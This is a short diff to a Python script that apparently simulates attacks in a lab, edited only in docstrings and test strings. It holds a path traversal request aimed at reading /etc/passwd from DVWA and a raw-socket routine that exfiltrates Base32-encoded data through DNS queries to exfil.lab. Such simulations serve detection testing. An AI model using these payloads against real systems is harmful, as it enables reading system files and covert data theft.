@@ -10,7 +10,7 @@ load_dotenv()
 TARGET_IP = os.getenv("TARGET_IP")
 
 def trigger_path_traversal(target_ip=TARGET_IP):
-    """Fires an HTTP path traversal payload against DVWA in my DMZ."""
+    """Fires an HTTP path traversal payload against DVWA."""
     url = f"http://{target_ip}/vulnerabilities/fi/?page=../../../../etc/passwd"
 
     print(f"[*] Triggering Web Attack (Path Traversal)...")
@@ -27,7 +27,7 @@ def trigger_path_traversal(target_ip=TARGET_IP):
 
 def trigger_dns_exfiltration(dns_server="10.1.4.1"):
     """Sends a raw Base32-encoded subdomain DNS query directly to pfSense over UDP 53."""
-    secret_payload = "CONFIDENTIAL_FRA_PORTFOLIO_TEST_DATA"
+    secret_payload = "CONFIDENTIAL_DEMO_TEST_DATA"
     encoded_str = base64.b32encode(secret_payload.encode()).decode().rstrip("=")[:20]
     test_domain = f"{encoded_str}.exfil.lab"
 
@@ -35,14 +35,13 @@ def trigger_dns_exfiltration(dns_server="10.1.4.1"):
     print(f"    Exfiltrating domain query: {test_domain}")
 
     try:
-        # Build a minimal raw DNS QNAME packet and send directly to pfSense IP
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         sock.settimeout(2)
 
         packet = b"\xaa\xaa\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
         for part in test_domain.split("."):
             packet += bytes([len(part)]) + part.encode()
-        packet += b"\x00\x00\x01\x00\x01"  # Type A, Class IN
+        packet += b"\x00\x00\x01\x00\x01"
 
         sock.sendto(packet, (dns_server, 53))
         print(f"    [+] Query sent directly to pfSense ({dns_server}:53) over UDP.")
